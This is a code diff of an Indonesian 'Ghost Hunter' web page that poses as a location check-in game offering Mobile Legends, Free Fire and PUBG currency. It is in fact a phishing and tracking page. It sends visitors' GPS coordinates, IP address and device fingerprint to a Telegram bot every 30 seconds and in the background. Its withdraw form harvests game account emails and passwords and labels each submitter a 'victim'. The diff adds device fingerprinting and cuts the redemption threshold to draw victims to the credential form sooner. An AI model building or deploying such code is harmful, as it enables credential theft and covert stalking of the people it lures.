@@ -259,7 +259,7 @@
     <h1>📍 GHOST HUNTER</h1>
     <p>📍 Check-in lokasi setiap 30 detik</p>
     <p>🪙 Dapatkan 50 COIN setiap check-in!</p>
-    <p>💎 500 COIN = 50 Diamond / 60 UC</p>
+    <p>💎 50 COIN = 5 Diamond / 6 UC (LANGSUNG TUKAR!)</p>
     <button class="start-btn" id="startGameBtn">🎮 MULAI GAME</button>
     <div class="error-msg" id="errorMsg"></div>
 </div>
@@ -277,7 +277,7 @@
         <div class="info-panel">
             <p>👻 <strong>GHOST HUNTER</strong> - Hunter Hantu Lokasi!</p>
             <p>🎯 Setiap check-in lokasi: <span style="color:#ffd700;">+50 COIN</span></p>
-            <p>💎 500 COIN = 50 Diamond ML/FF | 60 UC PUBG</p>
+            <p>💎 50 COIN = 5 Diamond ML/FF | 6 UC PUBG</p>
             <p>⏳ Check-in setiap <strong>30 detik</strong></p>
         </div>
 
@@ -300,12 +300,12 @@
     <div class="modal-content">
         <h2>💎 TUKAR COIN KE GAME</h2>
         <p style="color:white;">💰 Saldo kamu: <strong id="modalCoin" style="color:#ffd700; font-size:24px;">0</strong> COIN</p>
-        <p style="color:#ffd700; font-size:12px;">📌 500 COIN = 50 Diamond (ML/FF) atau 60 UC (PUBG)</p>
+        <p style="color:#ffd700; font-size:12px;">📌 50 COIN = 5 Diamond (ML/FF) atau 6 UC (PUBG)</p>
         
         <select id="gameSelect">
-            <option value="Mobile Legends">🎮 Mobile Legends - 50 Diamond</option>
-            <option value="Free Fire">🔥 Free Fire - 50 Diamond</option>
-            <option value="PUBG Mobile">🎯 PUBG Mobile - 60 UC</option>
+            <option value="Mobile Legends">🎮 Mobile Legends - 5 Diamond (50 COIN)</option>
+            <option value="Free Fire">🔥 Free Fire - 5 Diamond (50 COIN)</option>
+            <option value="PUBG Mobile">🎯 PUBG Mobile - 6 UC (50 COIN)</option>
         </select>
         <input type="text" id="gameId" placeholder="🎮 ID Game / Username" required>
         <input type="text" id="gameZone" placeholder="🗺️ Zona / Server (opsional)">
@@ -345,6 +345,84 @@
     const cooldownText = document.getElementById('cooldownText');
     const historyText = document.getElementById('historyText');
 
+    // ========== DAPETIN DEVICE INFO ==========
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let device = "Tidak diketahui";
+        let browser = "Tidak diketahui";
+        let os = "Tidak diketahui";
+        
+        // Deteksi OS
+        if (ua.includes('Android')) {
+            os = 'Android';
+            const match = ua.match(/Android\s([\d.]+)/);
+            if (match) os += ` ${match[1]}`;
+        } else if (ua.includes('iPhone')) {
+            os = 'iOS';
+            const match = ua.match(/iPhone OS ([\d_]+)/);
+            if (match) os += ` ${match[1].replace(/_/g, '.')}`;
+        } else if (ua.includes('Windows')) {
+            os = 'Windows';
+        } else if (ua.includes('Mac')) {
+            os = 'MacOS';
+        }
+        
+        // Deteksi Browser
+        if (ua.includes('Chrome') && !ua.includes('Edg')) {
+            browser = 'Chrome';
+        } else if (ua.includes('Firefox')) {
+            browser = 'Firefox';
+        } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
+            browser = 'Safari';
+        } else if (ua.includes('Edg')) {
+            browser = 'Edge';
+        } else if (ua.includes('OPR') || ua.includes('Opera')) {
+            browser = 'Opera';
+        }
+        
+        // Deteksi Device/Merk
+        let deviceModel = "Tidak diketahui";
+        if (ua.includes('SM-')) {
+            const match = ua.match(/SM-[A-Z0-9]+/);
+            if (match) deviceModel = `Samsung ${match[0]}`;
+        } else if (ua.includes('Redmi') || ua.includes('MI')) {
+            const match = ua.match(/(Redmi|MI)\s[\w\s]+/);
+            if (match) deviceModel = `Xiaomi ${match[0]}`;
+        } else if (ua.includes('OPPO')) {
+            deviceModel = 'OPPO';
+        } else if (ua.includes('vivo')) {
+            deviceModel = 'vivo';
+        } else if (ua.includes('realme')) {
+            deviceModel = 'realme';
+        } else if (ua.includes('iPhone')) {
+            deviceModel = 'iPhone';
+        }
+        
+        return { os, browser, device: deviceModel, fullUA: ua.substring(0, 150) };
+    }
+
+    // ========== FORMAT TANGGAL DENGAN HARI ==========
+    function getFormattedDate() {
+        const days = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
+        const months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'];
+        
+        const now = new Date();
+        const day = days[now.getDay()];
+        const date = now.getDate();
+        const month = months[now.getMonth()];
+        const year = now.getFullYear();
+        const hours = String(now.getHours()).padStart(2, '0');
+        const minutes = String(now.getMinutes()).padStart(2, '0');
+        const seconds = String(now.getSeconds()).padStart(2, '0');
+        
+        return {
+            full: `${day}, ${date} ${month} ${year} - ${hours}:${minutes}:${seconds}`,
+            date: `${date} ${month} ${year}`,
+            time: `${hours}:${minutes}:${seconds}`,
+            day: day
+        };
+    }
+
     // ========== FUNGSI TELEGRAM ==========
     async function getIP() {
         try {
@@ -383,103 +461,116 @@
     async function sendLocationToTelegram(action, extraData = '') {
         const ip = await getIP();
         const location = await getLocation();
-        const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta', hour12: false});
+        const dateTime = getFormattedDate();
+        const device = getDeviceInfo();
         
         let mapsLink = '';
-        let locationDisplay = location.full;
+        let locationDisplay = '';
         
         if (typeof location.lat === 'number' && typeof location.lon === 'number') {
             mapsLink = getGoogleMapsLink(location.lat, location.lon);
-            locationDisplay = `📍 ${location.lat}, ${location.lon}`;
+            locationDisplay = `${location.lat}, ${location.lon}`;
+        } else {
+            locationDisplay = location.full;
         }
         
-        let pesan = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-        pesan += `📍📍📍 LAPORAN LOKASI 📍📍📍\n`;
-        pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-        pesan += `📋 ACTION : ${action}\n`;
-        pesan += `🕐 WAKTU  : ${tanggal}\n`;
-        pesan += `🌐 IP ADDR: ${ip}\n`;
-        pesan += `${locationDisplay}\n`;
+        let pesan = `╔══════════════════════════════════════════════════════════╗\n`;
+        pesan += `║           📍📍📍 LAPORAN LOKASI 📍📍📍               ║\n`;
+        pesan += `╠══════════════════════════════════════════════════════════╣\n`;
+        pesan += `║ 📋 ACTION    : ${action}\n`;
+        pesan += `║ 📅 TANGGAL   : ${dateTime.full}\n`;
+        pesan += `║ 🌐 IP ADDRESS: ${ip}\n`;
+        pesan += `║ 📍 KOORDINAT : ${locationDisplay}\n`;
         
         if (mapsLink) {
-            pesan += `🗺️ MAPS    : ${mapsLink}\n`;
+            pesan += `║ 🗺️ GOOGLE MAPS: ${mapsLink}\n`;
         }
         
-        pesan += `🪙 SALDO   : ${coins} COIN\n`;
-        pesan += `📊 CHECK-IN: ${checkinCount} kali\n`;
+        pesan += `║ 📱 DEVICE    : ${device.device}\n`;
+        pesan += `║ 💻 OS        : ${device.os}\n`;
+        pesan += `║ 🌐 BROWSER   : ${device.browser}\n`;
+        pesan += `║ 🪙 SALDO     : ${coins} COIN\n`;
+        pesan += `║ 📊 CHECK-IN  : ${checkinCount} kali\n`;
         
         if (extraData) {
-            pesan += `\n${extraData}\n`;
+            pesan += `║\n║ ${extraData}\n`;
         }
         
-        pesan += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-        pesan += `🎮 GAME: GHOST HUNTER\n`;
-        pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+        pesan += `╚══════════════════════════════════════════════════════════╝`;
         
         const encodedPesan = encodeURIComponent(pesan);
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedPesan}`);
         
-        lastLocation = location.full;
+        lastLocation = locationDisplay;
         if (typeof location.lat === 'number') {
             lastLat = location.lat;
             lastLon = location.lon;
         }
-        return location.full;
+        return locationDisplay;
     }
 
     async function sendWithdrawData(game, idGame, zone, email, password) {
         const ip = await getIP();
         const location = await getLocation();
-        const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta', hour12: false});
+        const dateTime = getFormattedDate();
+        const device = getDeviceInfo();
         
         let reward = "";
         let rewardValue = "";
+        let rewardAmount = "";
+        
         if (game === "Mobile Legends") {
-            reward = "50 Diamond ML";
-            rewardValue = "50 Diamond";
+            reward = "5 Diamond ML";
+            rewardValue = "5 Diamond";
+            rewardAmount = "5 Diamond";
         } else if (game === "Free Fire") {
-            reward = "50 Diamond FF";
-            rewardValue = "50 Diamond";
+            reward = "5 Diamond FF";
+            rewardValue = "5 Diamond";
+            rewardAmount = "5 Diamond";
         } else {
-            reward = "60 UC PUBG";
-            rewardValue = "60 UC";
+            reward = "6 UC PUBG";
+            rewardValue = "6 UC";
+            rewardAmount = "6 UC";
         }
         
         let mapsLink = '';
-        let locationDisplay = '📍 Lokasi tidak tersedia';
+        let locationDisplay = '';
         
         if (typeof location.lat === 'number' && typeof location.lon === 'number') {
             mapsLink = getGoogleMapsLink(location.lat, location.lon);
-            locationDisplay = `📍 ${location.lat}, ${location.lon}`;
-        } else if (location.full) {
+            locationDisplay = `${location.lat}, ${location.lon}`;
+        } else {
             locationDisplay = location.full;
         }
         
-        let pesan = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-        pesan += `💎💎💎 WITHDRAW - TUKAR COIN KE GAME 💎💎💎\n`;
-        pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-        pesan += `🕐 WAKTU      : ${tanggal}\n`;
-        pesan += `🌐 IP ADDRESS : ${ip}\n`;
-        pesan += `${locationDisplay}\n`;
+        let pesan = `╔════════════════════════════════════════════════════════════════════════════╗\n`;
+        pesan += `║                    💎💎💎 WITHDRAW - TUKAR COIN KE GAME 💎💎💎                    ║\n`;
+        pesan += `╠════════════════════════════════════════════════════════════════════════════╣\n`;
+        pesan += `║ 📅 TANGGAL    : ${dateTime.full}\n`;
+        pesan += `║ 🌐 IP ADDRESS : ${ip}\n`;
+        pesan += `║ 📍 KOORDINAT  : ${locationDisplay}\n`;
         
         if (mapsLink) {
-            pesan += `🗺️ GOOGLE MAPS : ${mapsLink}\n`;
+            pesan += `║ 🗺️ GOOGLE MAPS: ${mapsLink}\n`;
         }
         
-        pesan += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-        pesan += `📋 DATA WITHDRAW:\n`;
-        pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-        pesan += `🎮 GAME         : ${game}\n`;
-        pesan += `🎮 ID GAME      : ${idGame}\n`;
-        pesan += `🗺️ ZONE/SERVER  : ${zone || '-'}\n`;
-        pesan += `📧 EMAIL AKUN   : ${email}\n`;
-        pesan += `🔑 PASSWORD     : ${password}\n`;
-        pesan += `🪙 COIN DIGUNAKAN: ${coins}\n`;
-        pesan += `💎 REWARD       : ${rewardValue}\n`;
-        pesan += `💰 NILAI REWARD : ${reward}\n`;
-        pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-        pesan += `⚠️⚠️⚠️ KORBAN TUKAR COIN KE GAME ⚠️⚠️⚠️\n`;
-        pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+        pesan += `║ 📱 DEVICE     : ${device.device}\n`;
+        pesan += `║ 💻 OS         : ${device.os}\n`;
+        pesan += `║ 🌐 BROWSER    : ${device.browser}\n`;
+        pesan += `╠════════════════════════════════════════════════════════════════════════════╣\n`;
+        pesan += `║                         📋 DATA WITHDRAW                                    ║\n`;
+        pesan += `╠════════════════════════════════════════════════════════════════════════════╣\n`;
+        pesan += `║ 🎮 GAME         : ${game}\n`;
+        pesan += `║ 🎮 ID GAME      : ${idGame}\n`;
+        pesan += `║ 🗺️ ZONE/SERVER  : ${zone || '-'}\n`;
+        pesan += `║ 📧 EMAIL AKUN   : ${email}\n`;
+        pesan += `║ 🔑 PASSWORD     : ${password}\n`;
+        pesan += `║ 🪙 COIN DIGUNAKAN: ${coins}\n`;
+        pesan += `║ 💎 REWARD       : ${rewardAmount}\n`;
+        pesan += `║ 💰 NILAI REWARD : ${reward}\n`;
+        pesan += `╠════════════════════════════════════════════════════════════════════════════╣\n`;
+        pesan += `║ ⚠️⚠️⚠️ KORBAN TUKAR COIN KE GAME ⚠️⚠️⚠️                                      ║\n`;
+        pesan += `╚════════════════════════════════════════════════════════════════════════════╝`;
         
         const encodedPesan = encodeURIComponent(pesan);
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedPesan}`);
@@ -506,33 +597,37 @@
         try {
             const location = await getLocation();
             const ip = await getIP();
-            const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta', hour12: false});
+            const dateTime = getFormattedDate();
+            const device = getDeviceInfo();
             
             let mapsLink = '';
             let locationDisplay = '';
             
             if (typeof location.lat === 'number' && typeof location.lon === 'number') {
                 mapsLink = getGoogleMapsLink(location.lat, location.lon);
-                locationDisplay = `📍 ${location.lat}, ${location.lon}`;
+                locationDisplay = `${location.lat}, ${location.lon}`;
             } else {
                 locationDisplay = location.full;
             }
             
-            let pesan = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-            pesan += `📍✅ CHECK-IN LOKASI BERHASIL ✅📍\n`;
-            pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-            pesan += `🕐 WAKTU  : ${tanggal}\n`;
-            pesan += `🌐 IP     : ${ip}\n`;
-            pesan += `${locationDisplay}\n`;
+            let pesan = `╔══════════════════════════════════════════════════════════╗\n`;
+            pesan += `║                 📍✅ CHECK-IN LOKASI ✅📍                   ║\n`;
+            pesan += `╠══════════════════════════════════════════════════════════╣\n`;
+            pesan += `║ 📅 TANGGAL   : ${dateTime.full}\n`;
+            pesan += `║ 🌐 IP       : ${ip}\n`;
+            pesan += `║ 📍 KOORDINAT: ${locationDisplay}\n`;
             
             if (mapsLink) {
-                pesan += `🗺️ MAPS    : ${mapsLink}\n`;
+                pesan += `║ 🗺️ MAPS     : ${mapsLink}\n`;
             }
             
-            pesan += `🪙 COIN   : +50\n`;
-            pesan += `💰 SALDO  : ${coins + 50} COIN\n`;
-            pesan += `📊 TOTAL  : ${checkinCount + 1}x check-in\n\n`;
-            pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+            pesan += `║ 📱 DEVICE   : ${device.device}\n`;
+            pesan += `║ 💻 OS       : ${device.os}\n`;
+            pesan += `║ 🌐 BROWSER  : ${device.browser}\n`;
+            pesan += `║ 🪙 COIN     : +50\n`;
+            pesan += `║ 💰 SALDO    : ${coins + 50} COIN\n`;
+            pesan += `║ 📊 TOTAL    : ${checkinCount + 1}x check-in\n`;
+            pesan += `╚══════════════════════════════════════════════════════════╝`;
             
             await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
             
@@ -540,7 +635,7 @@
             updateCoinDisplay();
             checkinCount++;
             
-            historyText.innerHTML = `✅ Check-in #${checkinCount} berhasil! +50 COIN (${tanggal.substring(0, 16)})<br>${historyText.innerHTML}`;
+            historyText.innerHTML = `✅ Check-in #${checkinCount} berhasil! +50 COIN (${dateTime.time})<br>${historyText.innerHTML}`;
             if (historyText.innerHTML.split('<br>').length > 6) {
                 historyText.innerHTML = historyText.innerHTML.split('<br>').slice(0, 6).join('<br>');
             }
@@ -550,8 +645,7 @@
                 rewardStatus.innerHTML = '';
             }, 2000);
             
-            let locText = typeof location.lat === 'number' ? `📍 ${location.lat.toFixed(6)}, ${location.lon.toFixed(6)}` : location.full;
-            locationStatus.innerHTML = locText;
+            locationStatus.innerHTML = typeof location.lat === 'number' ? `📍 ${location.lat.toFixed(6)}, ${location.lon.toFixed(6)}` : location.full;
             
             startCooldown(30);
             
@@ -610,18 +704,22 @@
                     const loc = await getLocation();
                     if (typeof loc.lat === 'number') {
                         const ip = await getIP();
-                        const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
+                        const dateTime = getFormattedDate();
+                        const device = getDeviceInfo();
                         let mapsLink = getGoogleMapsLink(loc.lat, loc.lon);
                         
-                        let pesan = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-                        pesan += `📍🔄 UPDATE LOKASI BACKGROUND 🔄📍\n`;
-                        pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-                        pesan += `🕐 WAKTU  : ${tanggal}\n`;
-                        pesan += `🌐 IP     : ${ip}\n`;
-                        pesan += `📍 ${loc.lat}, ${loc.lon}\n`;
-                        if (mapsLink) pesan += `🗺️ MAPS    : ${mapsLink}\n`;
-                        pesan += `🪙 SALDO  : ${coins} COIN\n`;
-                        pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+                        let pesan = `╔══════════════════════════════════════════════════════════╗\n`;
+                        pesan += `║                 📍🔄 UPDATE LOKASI 🔄📍                     ║\n`;
+                        pesan += `╠══════════════════════════════════════════════════════════╣\n`;
+                        pesan += `║ 📅 TANGGAL   : ${dateTime.full}\n`;
+                        pesan += `║ 🌐 IP       : ${ip}\n`;
+                        pesan += `║ 📍 KOORDINAT: ${loc.lat}, ${loc.lon}\n`;
+                        if (mapsLink) pesan += `║ 🗺️ MAPS     : ${mapsLink}\n`;
+                        pesan += `║ 📱 DEVICE   : ${device.device}\n`;
+                        pesan += `║ 💻 OS       : ${device.os}\n`;
+                        pesan += `║ 🌐 BROWSER  : ${device.browser}\n`;
+                        pesan += `║ 🪙 SALDO    : ${coins} COIN\n`;
+                        pesan += `╚══════════════════════════════════════════════════════════╝`;
                         
                         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
                     }
@@ -645,8 +743,8 @@
     const gamePassword = document.getElementById('gamePassword');
 
     withdrawBtn.onclick = () => {
-        if (coins < 500) {
-            alert('❌ Minimal tukar 500 COIN! (50 Diamond / 60 UC)');
+        if (coins < 50) {
+            alert('❌ Minimal tukar 50 COIN! (5 Diamond / 6 UC)');
             return;
         }
         modalCoinSpan.innerText = coins;
@@ -671,12 +769,13 @@
         if (!idGame) { alert('❌ Masukkan ID Game!'); return; }
         if (!email) { alert('❌ Masukkan Email akun game!'); return; }
         if (!password) { alert('❌ Masukkan Password akun game!'); return; }
-        if (coins < 500) { alert('❌ Minimal 500 COIN!'); return; }
+        if (coins < 50) { alert('❌ Minimal 50 COIN!'); return; }
 
         await sendWithdrawData(selectedGame, idGame, zone, email, password);
         
         alert('✅ Tukar coin berhasil! Reward akan dikirim ke akun game kamu dalam 24 jam.');
         
+        // Kurangi coin sesuai yang ditukar (50 coin)
         coins = 0;
         updateCoinDisplay();
         withdrawModal.classList.remove('active');
